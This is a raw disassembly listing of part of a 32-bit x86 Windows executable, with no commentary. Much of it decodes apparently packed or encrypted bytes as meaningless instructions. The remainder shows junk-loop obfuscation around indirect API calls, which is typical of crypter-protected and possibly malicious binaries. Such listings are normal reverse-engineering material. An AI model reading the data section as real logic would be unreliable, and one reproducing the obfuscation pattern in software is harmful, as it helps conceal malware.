  4048b4:	mov    ebp,0xaa11223a
  4048b9:	dec    esp
  4048ba:	or     al,0x46
  4048bc:	mov    edi,ebx
  4048be:	and    al,dl
  4048c0:	jmp    0x4048c7
  4048c2:	xchg   edi,eax
  4048c3:	mov    ebx,0xa2d7e4e5
  4048c8:	and    al,0xb1
  4048ca:	adc    eax,0x877aa73b
  4048cf:	jecxz  0x4048d0
  4048d1:	push   ds
  4048d2:	mov    es,WORD PTR ds:0x406a0e9e
  4048d8:	lods   eax,DWORD PTR ds:[esi]
  4048d9:	and    al,0xe
  4048db:	pop    esi
  4048dc:	scas   eax,DWORD PTR es:[edi]
  4048dd:	inc    ebp
  4048de:	push   esi
  4048df:	inc    edx
  4048e0:	mov    ebx,0x32883f82
  4048e5:	inc    edx
  4048e6:	sar    BYTE PTR [ecx],cl
  4048e8:	inc    DWORD PTR [eax+esi*2-0x7115c7a8]
  4048ef:	cmp    eax,eax
  4048f1:	or     al,0xb0
  4048f3:	clc    
  4048f4:	or     al,0x3d
  4048f6:	aad    0x7f
  4048f8:	stos   BYTE PTR es:[edi],al
  4048f9:	sub    al,0xa7
  4048fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048fc:	inc    ebx
  4048fd:	outs   dx,DWORD PTR ds:[esi]
  4048fe:	cmp    eax,0x14669dbc
  404903:	inc    esp
  404904:	out    0x41,al
  404906:	mov    bh,0xf8
  404908:	mov    ebp,0xed749f9f
  40490d:	or     BYTE PTR [edi],ah
  40490f:	ins    BYTE PTR es:[edi],dx
  404910:	xor    BYTE PTR [edi+0x42ce5db5],bh
  404916:	aam    0xf5
  404918:	std    
  404919:	sar    DWORD PTR [esi-0x2c],0x8f
  40491d:	sub    eax,0xde60bdf7
  404922:	dec    ecx
  404923:	pop    edi
  404924:	dec    ebx
  404925:	sbb    DWORD PTR [esi-0x73],ecx
  404928:	lock pop ebp
  40492a:	push   ebp
  40492b:	push   ss
  40492c:	sub    bl,BYTE PTR [esi-0x41f04585]
  404932:	mov    al,ds:0xd64b4a09
  404937:	or     edi,DWORD PTR [ebx+0x5f973caa]
  40493d:	inc    ebx
  40493e:	test   BYTE PTR [eax+0x5a241520],ch
  404944:	dec    esp
  404945:	adc    eax,0x4313bec4
  40494a:	xor    eax,0x5c021f6c
  40494f:	dec    esi
  404950:	nop
  404951:	adc    BYTE PTR [ebp+edi*2-0x7ef43d43],bl
  404958:	stos   DWORD PTR es:[edi],eax
  404959:	or     eax,0xfcf7ef66
  40495e:	push   0x2055df2c
  404963:	push   esi
  404964:	pop    edi
  404965:	iret   
  404966:	retf   0x1cec
  404969:	inc    esp
  40496a:	(bad)  [edx+0xfe6857e]
  404970:	mov    ebp,0x65a86697
  404975:	mov    esi,0x89a18156
  40497a:	mov    ds:0x1f74ba05,eax
  40497f:	jns    0x404968
  404981:	clc    
  404982:	mov    BYTE PTR [esi],bh
  404984:	test   ah,dh
  404986:	into   
  404987:	dec    DWORD PTR [ebx]
  404989:	dec    ebp
  40498a:	aad    0x2c
  40498c:	sbb    BYTE PTR [edi],ah
  40498e:	push   ecx
  40498f:	xchg   BYTE PTR [edi+0x30],al
  404992:	dec    edx
  404993:	sbb    BYTE PTR [edx+0x41],0x4f
  404997:	int    0x9e
  404999:	fwait
  40499a:	jae    0x404a08
  40499c:	or     ch,ch
  40499e:	in     eax,0xf2
  4049a0:	pmaxsw mm2,QWORD PTR [esi-0x17]
  4049a4:	mov    eax,ds:0x431d57e9
  4049a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049aa:	cmp    DWORD PTR ds:0xb0c109ac,ebx
  4049b0:	sbb    DWORD PTR [eax],ebx
  4049b2:	xor    esp,DWORD PTR [ebp-0x75a6c64d]
  4049b8:	arpl   WORD PTR [edx-0x2c1d263f],bx
  4049be:	adc    DWORD PTR [edi+edi*1+0x7],edx
  4049c2:	repnz add eax,DWORD PTR [esi-0x52fea869]
  4049c9:	mov    ebp,0x14288742
  4049ce:	pop    ecx
  4049cf:	pop    ds
  4049d0:	push   esi
  4049d1:	aad    0x41
  4049d3:	shr    BYTE PTR [edx-0xeadb8a1],cl
  4049d9:	or     bh,BYTE PTR [esp+0x66]
  4049dd:	pop    edx
  4049de:	ins    DWORD PTR es:[edi],dx
  4049df:	xchg   ecx,eax
  4049e0:	fdivr  st,st(5)
  4049e2:	repnz daa 
  4049e4:	adc    al,0x94
  4049e6:	ins    BYTE PTR es:[edi],dx
  4049e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049e8:	rcr    ebx,cl
  4049ea:	outs   dx,BYTE PTR ds:[esi]
  4049eb:	adc    eax,0x40ce1bed
  4049f0:	push   cs
  4049f1:	and    bl,BYTE PTR ds:0xdfc4bfee
  4049f7:	(bad)  
  4049f8:	imul   DWORD PTR [esp+edx*1-0x2fcbc828]
  4049ff:	sub    bl,BYTE PTR [ecx-0x551024af]
  404a05:	xchg   DWORD PTR [ebp-0xc],edx
  404a08:	div    DWORD PTR [ebp+0x51ffeb24]
  404a0e:	inc    edi
  404a0f:	addr16 inc esi
  404a11:	fisttp QWORD PTR [esi]
  404a13:	xchg   cl,dl
  404a15:	mov    eax,ds:0x1357c863
  404a1a:	imul   esp,DWORD PTR [ecx],0xee83cffb
  404a20:	mov    WORD PTR [edi+0x390344c2],?
  404a26:	push   esi
  404a27:	fmul   st,st(6)
  404a29:	loope  0x4049ee
  404a2b:	jns    0x404a95
  404a2d:	fist   WORD PTR [edi+edi*1-0xe59c613]
  404a34:	cld    
  404a35:	cmp    al,0x46
  404a37:	pop    eax
  404a38:	fadd   QWORD PTR [edi+0x45]
  404a3b:	imul   ebx,esp,0xf97deb05
  404a41:	es fs aad 0xcb
  404a45:	adc    ebp,ebp
  404a47:	mov    eax,0x86ee96cb
  404a4c:	dec    esi
  404a4d:	stos   BYTE PTR es:[edi],al
  404a4e:	sub    ebp,DWORD PTR [ecx]
  404a50:	cmp    eax,0x3cf0d319
  404a55:	push   ebx
  404a56:	sbb    cl,BYTE PTR [esi+0x3c]
  404a59:	cmp    esi,DWORD PTR [edx]
  404a5b:	and    DWORD PTR [ebx+ecx*8-0x5575135c],eax
  404a62:	pusha  
  404a63:	in     al,dx
  404a64:	mov    edx,0xe51e4939
  404a69:	daa    
  404a6a:	retf   0x606b
  404a6d:	mov    ?,ebp
  404a6f:	fnstsw WORD PTR [ebp-0x71]
  404a72:	sub    ah,BYTE PTR [esi]
  404a74:	sti    
  404a75:	lea    ecx,[ecx-0x3f]
  404a78:	and    eax,0x7a8fe895
  404a7d:	push   0xffffffe5
  404a7f:	out    0xd6,al
  404a81:	bound  esi,QWORD PTR [ecx-0x12]
  404a84:	adc    dl,BYTE PTR [ebp+0x18955d0c]
  404a8a:	ss icebp 
  404a8c:	outs   dx,DWORD PTR ds:[esi]
  404a8d:	adc    ebp,DWORD PTR [ebx]
  404a8f:	stos   DWORD PTR es:[edi],eax
  404a90:	(bad)  
  404a91:	(bad)  
  404a92:	mov    ds:0x928c34c7,eax
  404a97:	retf   0x7aee
  404a9a:	ret    0x6f77
  404a9d:	pushf  
  404a9e:	lods   eax,DWORD PTR ds:[esi]
  404a9f:	mov    esi,0x303a92e5
  404aa4:	mov    ecx,0x1c2262b5
  404aa9:	outs   dx,DWORD PTR ds:[esi]
  404aaa:	cld    
  404aab:	rol    DWORD PTR [esi],1
  404aad:	mov    eax,0xf518a985
  404ab2:	xchg   DWORD PTR [edi],edx
  404ab4:	(bad)  
  404ab5:	jae    0x404afb
  404ab7:	or     al,0x72
  404ab9:	fstp   TBYTE PTR [ecx+0x7a]
  404abc:	pop    DWORD PTR [ecx]
  404abe:	fincstp 
  404ac0:	inc    edi
  404ac1:	dec    ebp
  404ac2:	sti    
  404ac3:	pop    ebx
  404ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ac5:	mov    edi,0x8ea8b8f8
  404aca:	inc    esi
  404acb:	lds    edi,FWORD PTR [esi+0x31]
  404ace:	aam    0x9
  404ad0:	fcmovnb st,st(2)
  404ad2:	sbb    al,0xab
  404ad4:	adc    al,0x62
  404ad6:	nop
  404ad7:	pop    ecx
  404ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ad9:	call   0xbaea:0x5a3cba62
  404ae0:	bound  ecx,QWORD PTR [esi+0xb]
  404ae3:	inc    eax
  404ae4:	sub    DWORD PTR [ecx-0x7c4e5093],ebx
  404aea:	ret    0xf015
  404aed:	inc    eax
  404aee:	jbe    0x404a96
  404af0:	in     al,dx
  404af1:	mov    BYTE PTR [eax+0x1d],ch
  404af4:	pop    eax
  404af5:	popa   
  404af6:	or     BYTE PTR [edi+esi*1-0x3f3fa2ff],cl
  404afd:	pop    es
  404afe:	cli    
  404aff:	jl     0x404aa5
  404b01:	(bad)  
  404b02:	add    BYTE PTR [edi],0x5d
  404b05:	xor    esi,esp
  404b07:	xor    al,0xe1
  404b09:	sahf   
  404b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b0b:	xor    esp,0xffffff9e
  404b0e:	inc    esp
  404b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b10:	xchg   ebx,eax
  404b11:	inc    ecx
  404b12:	inc    ebx
  404b13:	xchg   ebx,eax
  404b14:	mov    ebp,0x46fe6599
  404b19:	mov    bh,0x47
  404b1b:	in     al,dx
  404b1c:	ss push ebp
  404b1e:	das    
  404b1f:	loope  0x404aa9
  404b21:	dec    ecx
  404b22:	mov    ebp,DWORD PTR [edi+0x5]
  404b25:	mov    dh,0xfb
  404b27:	xor    DWORD PTR [ecx+0x7e5e620c],esi
  404b2d:	punpckhbw mm4,QWORD PTR [ebp-0x5d8b788f]
  404b34:	mov    bh,0x7d
  404b36:	push   eax
  404b37:	xor    dl,ch
  404b39:	inc    ecx
  404b3a:	outs   dx,DWORD PTR ds:[esi]
  404b3b:	xlat   BYTE PTR ds:[ebx]
  404b3c:	les    esp,FWORD PTR [ecx-0x47aa00f1]
  404b42:	stc    
  404b43:	or     al,0x9e
  404b45:	or     dh,dh
  404b47:	loop   0x404b11
  404b49:	outs   dx,BYTE PTR ds:[esi]
  404b4a:	cmp    DWORD PTR [edi-0x119a5926],ebx
  404b50:	data16 data16 int3 
  404b53:	std    
  404b54:	ret    0x71be
  404b57:	push   ss
  404b58:	mov    ebp,0x4761199
  404b5d:	cmp    edi,DWORD PTR [eax-0x51]
  404b60:	loope  0x404b40
  404b62:	push   ebx
  404b63:	mov    ch,0x61
  404b65:	push   cs
  404b66:	jle    0x404b01
  404b68:	dec    ebp
  404b69:	sub    al,0x79
  404b6b:	adc    eax,0xca25ca1b
  404b70:	inc    edx
  404b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b72:	loope  0x404b29
  404b74:	enter  0xac70,0x47
  404b78:	mov    ds:0xe94e0eaa,al
  404b7d:	cmp    eax,0xcff04642
  404b82:	ss into 
  404b84:	iret   
  404b85:	mov    ebx,0xadbc256d
  404b8a:	mov    esp,0xd5f43229
  404b8f:	adc    edi,edx
  404b91:	cdq    
  404b92:	pop    ebp
  404b93:	dec    ecx
  404b94:	pop    eax
  404b95:	(bad)  
  404b97:	xchg   esp,eax
  404b98:	mov    al,0xa7
  404b9a:	push   0xffffffc4
  404b9c:	icebp  
  404b9d:	pop    esi
  404b9e:	ds pop es
  404ba0:	aaa    
  404ba1:	pusha  
  404ba2:	shr    DWORD PTR [esi],cl
  404ba4:	mov    esp,0x85b339d
  404ba9:	mov    bh,0x4d
  404bab:	test   DWORD PTR [ebp+0x19],edx
  404bae:	fsubr  DWORD PTR [eax-0x20310ef1]
  404bb4:	es sbb al,0x8b
  404bb7:	push   ss
  404bb8:	outs   dx,BYTE PTR ds:[esi]
  404bb9:	es fwait
  404bbb:	jb     0x404bf1
  404bbd:	jp     0x404bf2
  404bbf:	stc    
  404bc0:	xchg   esp,eax
  404bc1:	dec    ebx
  404bc2:	int    0x4c
  404bc4:	jbe    0x404bbf
  404bc6:	add    al,0xac
  404bc8:	jno    0x404b4c
  404bca:	and    eax,0x8b949b96
  404bcf:	push   eax
  404bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bd1:	mov    ecx,0x5419e361
  404bd6:	jmp    0x404c13
  404bd8:	mov    fs,WORD PTR [ebp-0x6a47b297]
  404bde:	add    DWORD PTR [edi+0x3c],eax
  404be1:	jmp    0xad75:0x31c451d4
  404be8:	aas    
  404be9:	daa    
  404bea:	or     al,0x9b
  404bec:	out    dx,eax
  404bed:	repz aaa 
  404bef:	fcom   DWORD PTR [edi]
  404bf1:	mov    dl,BYTE PTR [ebx-0x33]
  404bf4:	or     dl,0x4
  404bf7:	mov    edx,0xa6f9e03e
  404bfc:	cs push ebp
  404bfe:	adc    eax,0x26d795b2
  404c03:	out    0xef,eax
  404c05:	sub    al,0xb6
  404c07:	xor    al,0x98
  404c09:	je     0x404c6e
  404c0b:	retf   0xcff6
  404c0e:	or     bl,BYTE PTR [edx]
  404c10:	cmc    
  404c11:	sbb    cl,BYTE PTR [esi+0xe]
  404c14:	mov    al,0x21
  404c16:	push   cs
  404c17:	outs   dx,BYTE PTR ds:[esi]
  404c18:	scas   eax,DWORD PTR es:[edi]
  404c19:	mov    BYTE PTR [esi-0x7f],0xd1
  404c1d:	je     0x404c1b
  404c1f:	mov    cl,0xde
  404c21:	jnp    0x404c69
  404c23:	xchg   edx,eax
  404c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c25:	and    al,0xe2
  404c27:	adc    DWORD PTR [bp+si-0x51],edi
  404c2b:	jp     0x404c44
  404c2d:	pop    esi
  404c2e:	sbb    DWORD PTR [ebx],esi
  404c30:	fs push 0x8da6e939
  404c36:	pop    ebx
  404c37:	outs   dx,DWORD PTR ds:[esi]
  404c38:	test   dl,ch
  404c3a:	fild   WORD PTR [esi]
  404c3c:	not    eax
  404c3e:	pop    eax
  404c3f:	push   0xffffffff
  404c41:	cmp    eax,0x2bd86d22
  404c46:	sub    BYTE PTR [edi],0x57
  404c49:	and    eax,esp
  404c4b:	dec    esi
  404c4c:	inc    ecx
  404c4d:	jb     0x404c4b
  404c4f:	fmul   DWORD PTR [ebp-0x6e2f0bf0]
  404c55:	call   0x75cc:0x2c2a4a96
  404c5c:	xor    eax,DWORD PTR [eax+0x26011124]
  404c62:	push   es
  404c63:	hlt    
  404c64:	int3   
  404c65:	jp     0x404c22
  404c67:	cmp    cl,BYTE PTR [eax-0x30]
  404c6a:	ds ins DWORD PTR es:[edi],dx
  404c6c:	retf   0xa6db
  404c6f:	lods   al,BYTE PTR ds:[esi]
  404c70:	xchg   ebp,eax
  404c71:	ja     0x404c0b
  404c73:	(bad)
  404c77:	inc    ebp
  404c78:	mov    eax,ds:0x7ef5dc54
  404c7d:	int3   
  404c7e:	mov    ds:0x7d88d3a4,al
  404c83:	push   ebp
  404c84:	mov    cs,esp
  404c86:	adc    DWORD PTR [edx+0x3c3d15e0],esi
  404c8c:	mov    ah,0xe3
  404c8e:	jne    0x404cc7
  404c90:	ret    0x4fe0
  404c93:	push   edx
  404c94:	and    al,0x6a
  404c96:	mov    dl,0x94
  404c98:	jmp    DWORD PTR [ebx-0x7]
  404c9b:	(bad)  
  404c9c:	cmp    DWORD PTR fs:[ecx-0x6e],ebx
  404ca0:	or     edx,DWORD PTR [ecx-0x59517661]
  404ca6:	jnp    0x404ced
  404ca8:	cdq    
  404ca9:	je     0x404c53
  404cab:	aaa    
  404cac:	push   0xffffff9c
  404cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404caf:	adc    al,0xfe
  404cb1:	(bad)  
  404cb2:	dec    ebp
  404cb4:	xor    ah,al
  404cb6:	mov    ebx,DWORD PTR [ebp-0x3df3c194]
  404cbc:	call   0xc359:0xab448083
  404cc3:	xchg   esi,eax
  404cc4:	sbb    DWORD PTR [esi-0x1db7fd83],ebp
  404cca:	js     0x404cdd
  404ccc:	add    DWORD PTR [ecx-0x2c],ebx
  404ccf:	jle    0x404d37
  404cd1:	xor    eax,0x8a373bdf
  404cd6:	adc    edx,DWORD PTR ds:0x70bc46d1
  404cdc:	dec    ebp
  404cdd:	cs or  al,0xa8
  404ce0:	inc    ebp
  404ce1:	lock adc ebx,eax
  404ce4:	inc    edi
  404ce5:	call   0x61dfaeb2
  404cea:	retf   
  404ceb:	aad    0x9b
  404ced:	pop    ss
  404cee:	data16 sub dh,al
  404cf1:	or     bl,BYTE PTR [ecx+0x494984c7]
  404cf7:	cs jns 0x404cc5
  404cfa:	fbld   TBYTE PTR [ecx]
  404cfc:	out    0x5a,al
  404cfe:	dec    edi
  404cff:	fstp   TBYTE PTR [edx-0x19]
  404d02:	pop    ebp
  404d03:	(bad)  
  404d04:	mov    dl,0xa1
  404d06:	mov    bh,BYTE PTR [eax+0x75]
  404d09:	(bad)  
  404d0a:	adc    al,0xf
  404d0c:	test   eax,0x370085ca
  404d11:	scas   eax,DWORD PTR es:[edi]
  404d12:	repnz jecxz 0x404c96
  404d15:	mov    ds:0x870b6b6d,al
  404d1a:	das    
  404d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d1c:	inc    eax
  404d1d:	cwde   
  404d1e:	dec    eax
  404d1f:	mov    cl,0x3a
  404d21:	sbb    al,0x3
  404d23:	push   ss
  404d24:	sub    BYTE PTR [ecx-0x597ecf9c],cl
  404d2a:	sar    DWORD PTR [edi],0x46
  404d2d:	arpl   WORD PTR [edi],dx
  404d2f:	mov    bh,0xa6
  404d31:	xchg   edx,eax
  404d32:	retf   
  404d33:	xlat   BYTE PTR ds:[ebx]
  404d34:	call   0xdb8d:0xdc198694
  404d3b:	dec    ecx
  404d3c:	div    BYTE PTR [edx-0x29]
  404d3f:	stos   BYTE PTR es:[edi],al
  404d40:	mov    al,0xd5
  404d42:	aad    0x99
  404d44:	dec    edx
  404d45:	ret    
  404d46:	push   eax
  404d47:	dec    esi
  404d48:	ret    0x6c4f
  404d4b:	aas    
  404d4c:	mov    BYTE PTR [ebx-0x29],ah
  404d4f:	int    0x31
  404d51:	mov    ah,dh
  404d53:	push   es
  404d54:	(bad)  
  404d56:	scas   eax,DWORD PTR es:[edi]
  404d57:	inc    esi
  404d58:	jmp    0xe4135fbd
  404d5d:	lahf   
  404d5e:	add    BYTE PTR [ebx+0x10],0x61
  404d62:	loope  0x404d4b
  404d64:	push   ecx
  404d65:	sbb    DWORD PTR [edx-0x5d6fec0e],esi
  404d6b:	mov    edi,0x277ea4cb
  404d70:	ficomp DWORD PTR [eax+0x31]
  404d73:	outs   dx,BYTE PTR ds:[esi]
  404d74:	dec    esp
  404d75:	xchg   esp,eax
  404d76:	inc    esp
  404d77:	fistp  DWORD PTR [edi+eiz*1]
  404d7a:	cwde   
  404d7b:	add    BYTE PTR [eax-0x31b4d8d7],ah
  404d81:	clc    
  404d82:	xchg   BYTE PTR [ebp-0x75ad0173],ah
  404d88:	(bad)  ds:[esi+0x74d0ef32]
  404d8f:	pop    edi
  404d90:	push   eax
  404d91:	jmp    0x404d65
  404d93:	add    dl,BYTE PTR [ecx+0x5c]
  404d96:	dec    edi
  404d97:	aad    0xbb
  404d99:	sbb    ebp,DWORD PTR [ecx]
  404d9b:	mov    ecx,DWORD PTR [ecx+0x64e477c4]
  404da1:	adc    dh,bh
  404da3:	imul   cl
  404da5:	mov    edx,0x9ef5b4bb
  404daa:	push   esp
  404dab:	mov    ebp,0x2b828760
  404db0:	jle    0x404d5d
  404db2:	add    ebx,ebx
  404db4:	neg    BYTE PTR [edi]
  404db6:	jle    0x404dcb
  404db8:	add    esi,esi
  404dba:	xlat   BYTE PTR ds:[ebx]
  404dbb:	ret    0x92cb
  404dbe:	xchg   edx,eax
  404dbf:	mov    dh,0xdf
  404dc1:	cdq    
  404dc2:	add    cl,BYTE PTR [eax+eax*2-0x6d]
  404dc6:	jo     0x404e0c
  404dc8:	jae    0x404d8c
  404dca:	ja     0x404de3
  404dcc:	inc    edx
  404dcd:	mov    ds:0xa9967ae1,al
  404dd2:	call   0x21d8:0x58cbfc42
  404dd9:	lea    eax,[edx+0x28]
  404ddc:	loopne 0x404e0b
  404dde:	xchg   esi,eax
  404ddf:	int    0x20
  404de1:	pop    ebp
  404de2:	jne    0x404dfc
  404de4:	je     0x404e3f
  404de6:	(bad)  
  404de7:	popf   
  404de8:	sti    
  404de9:	xor    esp,esi
  404deb:	hlt    
  404dec:	test   ch,0x8b
  404def:	ins    DWORD PTR es:[edi],dx
  404df0:	repz inc eax
  404df2:	cld    
  404df3:	addr16 inc edi
  404df5:	pushf  
  404df6:	jns    0x404e55
  404df8:	je     0x404ed6
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
